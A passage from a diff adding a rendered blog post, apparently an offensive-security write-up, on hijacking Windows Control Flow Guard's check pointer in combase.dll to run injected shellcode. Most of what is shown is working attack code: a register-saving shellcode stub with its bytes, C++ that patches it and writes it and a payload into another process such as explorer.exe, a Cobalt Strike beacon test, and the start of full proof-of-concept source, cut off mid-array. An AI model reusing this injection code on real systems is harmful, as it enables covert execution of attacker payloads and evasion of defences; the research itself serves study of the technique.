+    <span class="n">FARPROC</span> <span class="n">icall_fptr_orig</span> <span class="o">=</span> <span class="p">(</span><span class="n">FARPROC</span><span class="p">)</span><span class="mh">0x4444444444444444</span><span class="p">;</span>
+    <span class="n">DWORD</span> <span class="n">oldprot</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+
+    <span class="c1">// restore original pointer value</span>
+    <span class="n">VirtualProtect</span><span class="p">(</span><span class="n">icall_fptr</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">FARPROC</span><span class="p">),</span> <span class="n">PAGE_READWRITE</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">oldprot</span><span class="p">);</span>
+    <span class="o">*</span><span class="n">icall_fptr</span> <span class="o">=</span> <span class="n">icall_fptr_orig</span><span class="p">;</span>
+    <span class="n">VirtualProtect</span><span class="p">(</span><span class="n">icall_fptr</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">FARPROC</span><span class="p">),</span> <span class="n">oldprot</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">oldprot</span><span class="p">);</span>
+
+    <span class="c1">// create thread starting at shellcode address</span>
+    <span class="n">CreateThread</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="p">(</span><span class="n">LPTHREAD_START_ROUTINE</span><span class="p">)</span><span class="mh">0x5555555555555555</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+
+    <span class="c1">// restore register values</span>
+    <span class="k">asm</span><span class="p">(</span>
+        <span class="s">"pop r13</span><span class="se">\n</span><span class="s">"</span>
+        <span class="s">"pop r12</span><span class="se">\n</span><span class="s">"</span>
+        <span class="s">"pop r11</span><span class="se">\n</span><span class="s">"</span>
+        <span class="s">"pop r10</span><span class="se">\n</span><span class="s">"</span>
+        <span class="s">"pop r9</span><span class="se">\n</span><span class="s">"</span>
+        <span class="s">"pop r8</span><span class="se">\n</span><span class="s">"</span>
+        <span class="s">"pop rsi</span><span class="se">\n</span><span class="s">"</span>
+        <span class="s">"pop rdi</span><span class="se">\n</span><span class="s">"</span>
+        <span class="s">"pop rcx</span><span class="se">\n</span><span class="s">"</span>
+        <span class="s">"pop rdi</span><span class="se">\n</span><span class="s">"</span>
+        <span class="s">"pop rax</span><span class="se">\n</span><span class="s">"</span>
+    <span class="p">);</span>
+
+	<span class="c1">// return 0, as that's what the original function did.</span>
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p><strong>compilation command line</strong></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>x86_64-w64-mingw32-gcc <span class="nt">-fPIC</span> <span class="nt">-masm</span><span class="o">=</span>intel ./stub.c <span class="nt">-o</span> stub.exe
+</code></pre></div></div>
+
+<p>We can then extract the <code class="language-plaintext highlighter-rouge">stub</code> function from the executable using a disassembler, for this I used Binary Ninja’s <code class="language-plaintext highlighter-rouge">bv.read</code> API, allowing us to read raw bytes from an address range.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">bv</span><span class="p">.</span><span class="n">read</span><span class="p">(</span><span class="mh">0x140001530</span><span class="p">,</span> <span class="mh">0x1400015e6</span>  <span class="o">-</span> <span class="mh">0x140001530</span> <span class="o">+</span> <span class="mi">1</span><span class="p">).</span><span class="nb">hex</span><span class="p">()</span>
+
+<span class="s">'4154534883ec5850575157564150415141524153415441554c8d4c244cc744244c00000000ba0800000049bc33333333333333334c894c24384c89e141b80400000048bb1111111111111111ffd34c8b4c2438448b44244c4c89e148b84444444444444444ba0800000049890424ffd3c7442420000000004531c931d248c74424280000000031c949b8555555555555555548b82222222222222222ffd0585f595f5e41584159415a415b415c415d4883c4585b415cc3'</span>
+</code></pre></div></div>
+
+<p>Now that we have this, we can replace the placeholder values and then write it before the payload in memory of the target process. The payload will be stored at <code class="language-plaintext highlighter-rouge">allocated_address + 0xc0</code>, as we need a 16-byte alligned base address for our shellcode.</p>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">BYTE</span> <span class="n">stub</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="mh">0x41</span><span class="p">,</span><span class="mh">0x54</span><span class="p">,</span><span class="mh">0x53</span><span class="p">,</span><span class="mh">0x48</span><span class="p">,</span><span class="mh">0x83</span><span class="p">,</span><span class="mh">0xec</span><span class="p">,</span><span class="mh">0x58</span><span class="p">,</span><span class="mh">0x50</span><span class="p">,</span><span class="mh">0x57</span><span class="p">,</span><span class="mh">0x51</span><span class="p">,</span><span class="mh">0x57</span><span class="p">,</span><span class="mh">0x56</span><span class="p">,</span><span class="mh">0x41</span><span class="p">,</span><span class="mh">0x50</span><span class="p">,</span><span class="mh">0x41</span><span class="p">,</span><span class="mh">0x51</span><span class="p">,</span><span class="mh">0x41</span><span class="p">,</span><span class="mh">0x52</span><span class="p">,</span><span class="mh">0x41</span><span class="p">,</span><span class="mh">0x53</span><span class="p">,</span><span class="mh">0x41</span><span class="p">,</span><span class="mh">0x54</span><span class="p">,</span><span class="mh">0x41</span><span class="p">,</span><span class="mh">0x55</span><span class="p">,</span><span class="mh">0x4c</span><span class="p">,</span><span class="mh">0x8d</span><span class="p">,</span><span class="mh">0x4c</span><span class="p">,</span><span class="mh">0x24</span><span class="p">,</span><span class="mh">0x4c</span><span class="p">,</span><span class="mh">0xc7</span><span class="p">,</span><span class="mh">0x44</span><span class="p">,</span><span class="mh">0x24</span><span class="p">,</span><span class="mh">0x4c</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0xba</span><span class="p">,</span><span class="mh">0x08</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span>
+    <span class="mh">0x49</span><span class="p">,</span><span class="mh">0xbc</span><span class="p">,</span>
+    <span class="mh">0x33</span><span class="p">,</span><span class="mh">0x33</span><span class="p">,</span><span class="mh">0x33</span><span class="p">,</span><span class="mh">0x33</span><span class="p">,</span><span class="mh">0x33</span><span class="p">,</span><span class="mh">0x33</span><span class="p">,</span><span class="mh">0x33</span><span class="p">,</span><span class="mh">0x33</span><span class="p">,</span>
+    <span class="mh">0x4c</span><span class="p">,</span><span class="mh">0x89</span><span class="p">,</span><span class="mh">0x4c</span><span class="p">,</span><span class="mh">0x24</span><span class="p">,</span><span class="mh">0x38</span><span class="p">,</span><span class="mh">0x4c</span><span class="p">,</span><span class="mh">0x89</span><span class="p">,</span><span class="mh">0xe1</span><span class="p">,</span><span class="mh">0x41</span><span class="p">,</span><span class="mh">0xb8</span><span class="p">,</span><span class="mh">0x04</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x48</span><span class="p">,</span><span class="mh">0xbb</span><span class="p">,</span><span class="mh">0x11</span><span class="p">,</span><span class="mh">0x11</span><span class="p">,</span><span class="mh">0x11</span><span class="p">,</span><span class="mh">0x11</span><span class="p">,</span><span class="mh">0x11</span><span class="p">,</span><span class="mh">0x11</span><span class="p">,</span><span class="mh">0x11</span><span class="p">,</span><span class="mh">0x11</span><span class="p">,</span><span class="mh">0xff</span><span class="p">,</span><span class="mh">0xd3</span><span class="p">,</span><span class="mh">0x4c</span><span class="p">,</span><span class="mh">0x8b</span><span class="p">,</span><span class="mh">0x4c</span><span class="p">,</span><span class="mh">0x24</span><span class="p">,</span><span class="mh">0x38</span><span class="p">,</span><span class="mh">0x44</span><span class="p">,</span><span class="mh">0x8b</span><span class="p">,</span><span class="mh">0x44</span><span class="p">,</span><span class="mh">0x24</span><span class="p">,</span><span class="mh">0x4c</span><span class="p">,</span><span class="mh">0x4c</span><span class="p">,</span><span class="mh">0x89</span><span class="p">,</span><span class="mh">0xe1</span><span class="p">,</span><span class="mh">0x48</span><span class="p">,</span><span class="mh">0xb8</span><span class="p">,</span><span class="mh">0x44</span><span class="p">,</span><span class="mh">0x44</span><span class="p">,</span><span class="mh">0x44</span><span class="p">,</span><span class="mh">0x44</span><span class="p">,</span><span class="mh">0x44</span><span class="p">,</span><span class="mh">0x44</span><span class="p">,</span><span class="mh">0x44</span><span class="p">,</span><span class="mh">0x44</span><span class="p">,</span><span class="mh">0xba</span><span class="p">,</span><span class="mh">0x08</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x49</span><span class="p">,</span><span class="mh">0x89</span><span class="p">,</span><span class="mh">0x04</span><span class="p">,</span><span class="mh">0x24</span><span class="p">,</span><span class="mh">0xff</span><span class="p">,</span><span class="mh">0xd3</span><span class="p">,</span><span class="mh">0xc7</span><span class="p">,</span><span class="mh">0x44</span><span class="p">,</span><span class="mh">0x24</span><span class="p">,</span><span class="mh">0x20</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x45</span><span class="p">,</span><span class="mh">0x31</span><span class="p">,</span><span class="mh">0xc9</span><span class="p">,</span><span class="mh">0x31</span><span class="p">,</span><span class="mh">0xd2</span><span class="p">,</span><span class="mh">0x48</span><span class="p">,</span><span class="mh">0xc7</span><span class="p">,</span><span class="mh">0x44</span><span class="p">,</span><span class="mh">0x24</span><span class="p">,</span><span class="mh">0x28</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x31</span><span class="p">,</span><span class="mh">0xc9</span><span class="p">,</span><span class="mh">0x49</span><span class="p">,</span><span class="mh">0xb8</span><span class="p">,</span><span class="mh">0x55</span><span class="p">,</span><span class="mh">0x55</span><span class="p">,</span><span class="mh">0x55</span><span class="p">,</span><span class="mh">0x55</span><span class="p">,</span><span class="mh">0x55</span><span class="p">,</span><span class="mh">0x55</span><span class="p">,</span><span class="mh">0x55</span><span class="p">,</span><span class="mh">0x55</span><span class="p">,</span><span class="mh">0x48</span><span class="p">,</span><span class="mh">0xb8</span><span class="p">,</span><span class="mh">0x22</span><span class="p">,</span><span class="mh">0x22</span><span class="p">,</span><span class="mh">0x22</span><span class="p">,</span><span class="mh">0x22</span><span class="p">,</span><span class="mh">0x22</span><span class="p">,</span><span class="mh">0x22</span><span class="p">,</span><span class="mh">0x22</span><span class="p">,</span><span class="mh">0x22</span><span class="p">,</span><span class="mh">0xff</span><span class="p">,</span><span class="mh">0xd0</span><span class="p">,</span><span class="mh">0x58</span><span class="p">,</span><span class="mh">0x5f</span><span class="p">,</span><span class="mh">0x59</span><span class="p">,</span><span class="mh">0x5f</span><span class="p">,</span><span class="mh">0x5e</span><span class="p">,</span><span class="mh">0x41</span><span class="p">,</span><span class="mh">0x58</span><span class="p">,</span><span class="mh">0x41</span><span class="p">,</span><span class="mh">0x59</span><span class="p">,</span><span class="mh">0x41</span><span class="p">,</span><span class="mh">0x5a</span><span class="p">,</span><span class="mh">0x41</span><span class="p">,</span><span class="mh">0x5b</span><span class="p">,</span><span class="mh">0x41</span><span class="p">,</span><span class="mh">0x5c</span><span class="p">,</span><span class="mh">0x41</span><span class="p">,</span><span class="mh">0x5d</span><span class="p">,</span><span class="mh">0x48</span><span class="p">,</span><span class="mh">0x83</span><span class="p">,</span><span class="mh">0xc4</span><span class="p">,</span><span class="mh">0x58</span><span class="p">,</span><span class="mh">0x5b</span><span class="p">,</span><span class="mh">0x41</span><span class="p">,</span><span class="mh">0x5c</span><span class="p">,</span><span class="mh">0xc3</span>
+<span class="p">};</span>
+<span class="n">HMODULE</span> <span class="n">kernel32</span> <span class="o">=</span> <span class="n">GetModuleHandleA</span><span class="p">(</span><span class="s">"KERNEL32.DLL"</span><span class="p">);</span>
+<span class="n">FARPROC</span> <span class="n">_VirtualProtect</span> <span class="o">=</span> <span class="n">GetProcAddress</span><span class="p">(</span><span class="n">kernel32</span><span class="p">,</span> <span class="s">"VirtualProtect"</span><span class="p">);</span>
+<span class="n">FARPROC</span> <span class="n">_CreateThread</span> <span class="o">=</span> <span class="n">GetProcAddress</span><span class="p">(</span><span class="n">kernel32</span><span class="p">,</span> <span class="s">"CreateThread"</span><span class="p">);</span>
+<span class="n">BYTE</span><span class="o">*</span> <span class="n">shellcode_address</span> <span class="o">=</span> <span class="n">base_address</span> <span class="o">+</span> <span class="mh">0xc0</span><span class="p">;</span>
+<span class="n">memcpy</span><span class="p">(</span><span class="n">stub</span> <span class="o">+</span> <span class="mi">44</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">__guard_check_icall_fptr</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">FARPROC</span><span class="o">*</span><span class="p">));</span>
+<span class="n">memcpy</span><span class="p">(</span><span class="n">stub</span> <span class="o">+</span> <span class="mi">68</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">_VirtualProtect</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">FARPROC</span><span class="p">));</span>
+<span class="n">memcpy</span><span class="p">(</span><span class="n">stub</span> <span class="o">+</span> <span class="mi">93</span><span class="p">,</span> <span class="n">__guard_check_icall_fptr</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">FARPROC</span><span class="p">));</span>
+<span class="n">memcpy</span><span class="p">(</span><span class="n">stub</span> <span class="o">+</span> <span class="mi">138</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">shellcode_address</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">FARPROC</span><span class="p">));</span>
+<span class="n">memcpy</span><span class="p">(</span><span class="n">stub</span> <span class="o">+</span> <span class="mi">148</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">_CreateThread</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">FARPROC</span><span class="p">));</span>
+
+<span class="n">WriteProcessMemory</span><span class="p">(</span><span class="n">process</span><span class="p">,</span> <span class="n">base_address</span><span class="p">,</span> <span class="n">stub</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">stub</span><span class="p">),</span> <span class="nb">NULL</span><span class="p">);</span>
+<span class="n">WriteProcessMemory</span><span class="p">(</span><span class="n">process</span><span class="p">,</span> <span class="n">shellcode_address</span><span class="p">,</span> <span class="n">shellcode</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">),</span> <span class="nb">NULL</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>Replacing the shellcode for a Cobalt Strike beacon, we can now give it a test.</p>
+
+<p><em>Note: avoid msfvenom’s <code class="language-plaintext highlighter-rouge">windows/x64/exec</code> shellcode as it crashes the target process after execution and could give to misleading results here.</em></p>
+
+<p><img src="https://www.legacyy.xyz/assets/img/posts/abusing-control-flow-guard-for-control-flow-hijacking/final_poc_test.png" alt="Testing POC with Cobalt Strike beacon now that we have Shellcode Stub"></p>
+
+<h1 id="full-source-code">Full Source Code</h1>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;windows.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span>
+<span class="cp">#pragma region [colour codes]
+</span>
+<span class="cp">#define COLOUR_DEFAULT "\033[0m"
+#define COLOUR_BOLD "\033[1m"
+#define COLOUR_UNDERLINE "\033[4m"
+#define COLOUR_NO_UNDERLINE "\033[24m"
+#define COLOUR_NEGATIVE "\033[7m"
+#define COLOUR_POSITIVE "\033[27m"
+#define COLOUR_BLACK "\033[30m"
+#define COLOUR_RED "\033[31m"
+#define COLOUR_GREEN "\033[32m"
+#define COLOUR_YELLOW "\033[33m"
+#define COLOUR_BLUE "\033[34m"
+#define COLOUR_MAGENTA "\033[35m"
+#define COLOUR_CYAN "\033[36m"
+#define COLOUR_LIGHTGRAY "\033[37m"
+#define COLOUR_DARKGRAY "\033[90m"
+#define COLOUR_LIGHTRED "\033[91m"
+#define COLOUR_LIGHTGREEN "\033[92m"
+#define COLOUR_LIGHTYELLOW "\033[93m"
+#define COLOUR_LIGHTBLUE "\033[94m"
+#define COLOUR_LIGHTMAGENTA "\033[95m"
+#define COLOUR_LIGHTCYAN "\033[96m"
+#define COLOUR_WHITE "\033[97m"
+</span>
+<span class="cp">#pragma endregion
+</span>
+<span class="cp">#pragma region [dprintf]
+</span>
+<span class="cp">#if _DEBUG
+#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+#define dprintf(fmt, ...)		printf(fmt, __VA_ARGS__)
+#define LOG_SUCCESS(fmt, ...)	printf(COLOUR_BOLD COLOUR_GREEN   "[+]" COLOUR_DEFAULT " [" __FUNCTION__ "] " fmt "\n", __VA_ARGS__)
+#define LOG_INFO(fmt, ...)		printf(COLOUR_BOLD COLOUR_BLUE    "[*]" COLOUR_DEFAULT " [" __FUNCTION__ "] " fmt "\n", __VA_ARGS__)
+#define LOG_ERROR(fmt, ...)		printf(COLOUR_BOLD COLOUR_RED     "[!]" COLOUR_DEFAULT " [" __FUNCTION__ "] " fmt "\n", __VA_ARGS__)
+#define LOG_DEBUG(fmt, ...)		printf(COLOUR_BOLD COLOUR_MAGENTA "[D]" COLOUR_DEFAULT " [" __FUNCTION__ "] " fmt "\n", __VA_ARGS__)
+#else
+#define dprintf(fmt, ...)     (0)
+#define LOG_SUCCESS(fmt, ...) (0)
+#define LOG_INFO(fmt, ...)	  (0)
+#define LOG_ERROR(fmt, ...)	  (0)
+#define LOG_DEBUG(fmt, ...)	  (0)
+#endif
+</span>
+<span class="cp">#pragma endregion
+</span>
+<span class="c1">//</span>
+<span class="c1">// Search a region of memory for an egg. Returns NULL on failure.</span>
+<span class="c1">//</span>
+<span class="n">PVOID</span> <span class="nf">EggHunt</span><span class="p">(</span><span class="n">_In_</span> <span class="n">PVOID</span> <span class="n">RegionStart</span><span class="p">,</span> <span class="n">_In_</span> <span class="n">SIZE_T</span> <span class="n">RegionLength</span><span class="p">,</span> <span class="n">_In_</span> <span class="n">PVOID</span> <span class="n">Egg</span><span class="p">,</span> <span class="n">_In_</span> <span class="n">SIZE_T</span> <span class="n">EggLength</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">RegionStart</span> <span class="o">||</span> <span class="o">!</span><span class="n">RegionLength</span> <span class="o">||</span> <span class="o">!</span><span class="n">Egg</span> <span class="o">||</span> <span class="o">!</span><span class="n">EggLength</span><span class="p">)</span>
+        <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
+
+    <span class="k">for</span> <span class="p">(</span><span class="n">CHAR</span><span class="o">*</span> <span class="n">pchar</span> <span class="o">=</span> <span class="p">(</span><span class="n">CHAR</span><span class="o">*</span><span class="p">)</span><span class="n">RegionStart</span><span class="p">;</span> <span class="n">RegionLength</span> <span class="o">&gt;=</span> <span class="n">EggLength</span><span class="p">;</span> <span class="o">++</span><span class="n">pchar</span><span class="p">,</span> <span class="o">--</span><span class="n">RegionLength</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">memcmp</span><span class="p">(</span><span class="n">pchar</span><span class="p">,</span> <span class="n">Egg</span><span class="p">,</span> <span class="n">EggLength</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
+            <span class="k">return</span> <span class="n">pchar</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="n">VOID</span> <span class="n">poc</span><span class="p">(</span><span class="n">INT</span> <span class="n">pid</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="n">HMODULE</span> <span class="n">combase</span> <span class="o">=</span> <span class="n">LoadLibraryA</span><span class="p">(</span><span class="s">"combase.dll"</span><span class="p">);</span>
+    
+    <span class="n">FARPROC</span> <span class="n">NdrProxyForwardingFunction13</span> <span class="o">=</span> <span class="n">GetProcAddress</span><span class="p">(</span><span class="n">combase</span><span class="p">,</span> <span class="s">"NdrProxyForwardingFunction13"</span><span class="p">);</span>
+    <span class="n">LOG_INFO</span><span class="p">(</span><span class="s">"NdrProxyForwardingFunction13 @ 0x%016llx"</span><span class="p">,</span> <span class="p">(</span><span class="kt">size_t</span><span class="p">)</span><span class="n">NdrProxyForwardingFunction13</span><span class="p">);</span>
+
+    <span class="cm">/*
+    18021e30c  4c8b11             mov     r10, qword [rcx]
+    18021e30f  498b4a68           mov     rcx, qword [r10+0x68]
+    18021e313  ff159f6b0900       call    qword [rel __guard_check_icall_fptr]  {_guard_check_icall_nop}
+    */</span>
+    <span class="n">BYTE</span> <span class="n">egg___guard_check_icall_fptr</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="mh">0x4c</span><span class="p">,</span> <span class="mh">0x8b</span><span class="p">,</span> <span class="mh">0x11</span><span class="p">,</span>        <span class="c1">// mov     r10, qword [rcx]</span>
+        <span class="mh">0x49</span><span class="p">,</span> <span class="mh">0x8b</span><span class="p">,</span> <span class="mh">0x4a</span><span class="p">,</span> <span class="mh">0x68</span><span class="p">,</span>  <span class="c1">// mov     rcx, qword [r10+0x68]</span>
+        <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0x15</span>               <span class="c1">// call    qword [rel __guard_check_icall_fptr]  {_guard_check_icall_nop}</span>
+        <span class="c1">// next 4 bytes are the offset</span>
+    <span class="p">};</span>
+
+    <span class="n">BYTE</span><span class="o">*</span> <span class="n">egg_location</span> <span class="o">=</span> <span class="p">(</span><span class="n">BYTE</span><span class="o">*</span><span class="p">)</span><span class="n">EggHunt</span><span class="p">(</span><span class="n">NdrProxyForwardingFunction13</span><span class="p">,</span> <span class="mi">256</span><span class="p">,</span> <span class="n">egg___guard_check_icall_fptr</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">egg___guard_check_icall_fptr</span><span class="p">));</span>
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">egg_location</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="n">LOG_ERROR</span><span class="p">(</span><span class="s">"Failed to locate __guard_check_icall_fptr call offset @ combase.dll!NdrProxyForwardingFunction13"</span><span class="p">);</span>
+        <span class="k">return</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="n">BYTE</span><span class="o">*</span> <span class="n">egg_end</span> <span class="o">=</span> <span class="n">egg_location</span> <span class="o">+</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">egg___guard_check_icall_fptr</span><span class="p">);</span>
+    <span class="n">LOG_INFO</span><span class="p">(</span><span class="s">"combase.dll!__guard_check_icall_fptr egg @ %p"</span><span class="p">,</span> <span class="n">egg_location</span><span class="p">);</span>
+    <span class="n">LOG_INFO</span><span class="p">(</span><span class="s">"combase.dll!__guard_check_icall_fptr egg_end @ %p"</span><span class="p">,</span> <span class="n">egg_end</span><span class="p">);</span>
+
+    <span class="n">DWORD</span> <span class="n">offset</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">DWORD</span><span class="o">*</span><span class="p">)</span><span class="n">egg_end</span><span class="p">;</span>
+    <span class="n">LOG_INFO</span><span class="p">(</span><span class="s">"combase.dll!__guard_check_icall_fptr call offset =&gt; 0x%08lx"</span><span class="p">,</span> <span class="n">offset</span><span class="p">);</span>
+    <span class="n">FARPROC</span><span class="o">*</span> <span class="n">__guard_check_icall_fptr</span> <span class="o">=</span> <span class="p">(</span><span class="n">FARPROC</span><span class="o">*</span><span class="p">)(</span><span class="n">egg_end</span> <span class="o">+</span> <span class="n">offset</span> <span class="o">+</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">DWORD</span><span class="p">));</span>
+    <span class="n">FARPROC</span> <span class="n">_guard_check_icall_nop</span> <span class="o">=</span> <span class="o">*</span><span class="n">__guard_check_icall_fptr</span><span class="p">;</span>
+    <span class="n">LOG_SUCCESS</span><span class="p">(</span><span class="s">"combase.dll!__guard_check_icall_fptr @ %p"</span><span class="p">,</span> <span class="n">__guard_check_icall_fptr</span><span class="p">);</span>
+    <span class="n">LOG_SUCCESS</span><span class="p">(</span><span class="s">"combase.dll!_guard_check_icall_nop @ %p"</span><span class="p">,</span> <span class="n">_guard_check_icall_nop</span><span class="p">);</span>
+
+    <span class="c1">//</span>
+    <span class="c1">// process injection stuff</span>
+    <span class="c1">//</span>
+    <span class="n">HANDLE</span> <span class="n">process</span> <span class="o">=</span> <span class="n">OpenProcess</span><span class="p">(</span><span class="n">PROCESS_ALL_ACCESS</span><span class="p">,</span> <span class="n">FALSE</span><span class="p">,</span> <span class="n">pid</span><span class="p">);</span> <span class="c1">// explorer.exe rn</span>
+
+    <span class="c1">//</span>
+    <span class="c1">// Allocate &amp; write shellcode to target process.</span>
+    <span class="c1">//</span>
+    <span class="n">BYTE</span><span class="o">*</span> <span class="n">base_address</span> <span class="o">=</span> <span class="p">(</span><span class="n">BYTE</span><span class="o">*</span><span class="p">)</span><span class="n">VirtualAllocEx</span><span class="p">(</span><span class="n">process</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span> <span class="o">+</span> <span class="mh">0xc0</span><span class="p">,</span> <span class="n">MEM_COMMIT</span> <span class="o">|</span> <span class="n">MEM_RESERVE</span><span class="p">,</span> <span class="n">PAGE_EXECUTE_READWRITE</span><span class="p">);</span>
+
+    <span class="n">BYTE</span> <span class="n">stub</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="mh">0x41</span><span class="p">,</span><span class="mh">0x54</span><span class="p">,</span><span class="mh">0x53</span><span class="p">,</span><span class="mh">0x48</span><span class="p">,</span><span class="mh">0x83</span><span class="p">,</span><span class="mh">0xec</span><span class="p">,</span><span class="mh">0x58</span><span class="p">,</span><span class="mh">0x50</span><span class="p">,</span><span class="mh">0x57</span><span class="p">,</span><span class="mh">0x51</span><span class="p">,</span><span class="mh">0x57</span><span class="p">,</span><span class="mh">0x56</span><span class="p">,</span><span class="mh">0x41</span><span class="p">,</span><span class="mh">0x50</span><span class="p">,</span><span class="mh">0x41</span><span class="p">,</span><span class="mh">0x51</span><span class="p">,</span><span class="mh">0x41</span><span class="p">,</span><span class="mh">0x52</span><span class="p">,</span><span class="mh">0x41</span><span class="p">,</span><span class="mh">0x53</span><span class="p">,</span><span class="mh">0x41</span><span class="p">,</span><span class="mh">0x54</span><span class="p">,</span><span class="mh">0x41</span><span class="p">,</span><span class="mh">0x55</span><span class="p">,</span><span class="mh">0x4c</span><span class="p">,</span><span class="mh">0x8d</span><span class="p">,</span><span class="mh">0x4c</span><span class="p">,</span><span class="mh">0x24</span><span class="p">,</span><span class="mh">0x4c</span><span class="p">,</span><span class="mh">0xc7</span><span class="p">,</span><span class="mh">0x44</span><span class="p">,</span><span class="mh">0x24</span><span class="p">,</span><span class="mh">0x4c</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0xba</span><span class="p">,</span><span class="mh">0x08</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span>
+        <span class="mh">0x49</span><span class="p">,</span><span class="mh">0xbc</span><span class="p">,</span>
+        <span class="mh">0x33</span><span class="p">,</span><span class="mh">0x33</span><span class="p">,</span><span class="mh">0x33</span><span class="p">,</span><span class="mh">0x33</span><span class="p">,</span><span class="mh">0x33</span><span class="p">,</span><span class="mh">0x33</span><span class="p">,</span><span class="mh">0x33</span><span class="p">,</span><span class="mh">0x33</span><span class="p">,</span>
+        <span class="mh">0x4c</span><span class="p">,</span><span class="mh">0x89</span><span class="p">,</span><span class="mh">0x4c</span><span class="p">,</span><span class="mh">0x24</span><span class="p">,</span><span class="mh">0x38</span><span class="p">,</span><span class="mh">0x4c</span><span class="p">,</span><span class="mh">0x89</span><span class="p">,</span><span class="mh">0xe1</span><span class="p">,</span><span class="mh">0x41</span><span class="p">,</span><span class="mh">0xb8</span><span class="p">,</span><span class="mh">0x04</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x00</span><span class="p">,</span><span class="mh">0x48</span><span class="p">,</span><span class="mh">0xbb</span><span class="p">,</span><span class="mh">0x11</span><span class="p">,</span><span class="mh">0x11</span><span class="p">,</span><span class="mh">0x11</span><span class="p">,</span><span class="mh">0x11</span><span class="p">,</span><span class="mh">0x11</span><span class="p">,</span><span class="mh">0x11</span><span class="p">,</span><span class="mh">0x11</span><span class="p">,</span><span class="mh">0x11</span><span class="p">,</span><span class="mh">0xff</span><span class="p">,</span><span class="mh">0xd3</span><span class="p">,</span><span class="mh">0x4c</span><span class="p">,</span><span class="mh">0x8b</span><span class="p">,</span><span class="mh">0x4c</span><span class="p">,</span><span class="mh">0x24</span><span class="p">,</span><span class="mh">0x38</span><span class="p">,</span><span class="mh">0x44</span><span class="p">,</span><span class="mh">0x8b</span><span class="p">,</span><span 